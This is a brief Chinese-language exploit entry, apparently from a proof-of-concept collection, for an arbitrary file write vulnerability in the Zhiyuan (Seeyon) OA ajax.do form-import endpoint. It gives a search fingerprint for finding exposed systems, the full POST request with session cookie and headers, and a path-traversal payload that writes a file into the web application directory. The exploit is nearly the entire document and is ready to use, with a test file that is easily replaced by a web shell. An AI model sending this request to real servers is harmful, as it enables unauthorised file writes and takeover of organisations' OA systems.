# 致远OA后台表单导入ajax.do任意文件写入漏洞

- **系统**：致远OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="致远互联-OA"`
- **请求**：`POST /seeyon/ajax.do?method=ajaxAction&managerName=cap4FormDesignManager HTTP/1.1`
- **关键头**：`Content-Length: 331`　`Content-Type: application/x-www-form-urlencoded;charset=UTF-8`　`Cookie: ts=1728653264995; JSESSIONID=EADD9E1D7E239870F85E73935AC9AD34; loginPageURL=; lo…`　`Host: 192.168.18.129:8085`　`RequestType: AJAX`

**请求体 / payload**
```
managerMethod=generateInfopath&arguments={"files":[{"fileName":"../../../../../../ApacheJetspeed/webapps/seeyon/11.txt","fileContent":"1111"}]}
```
- **预期**：200　|　—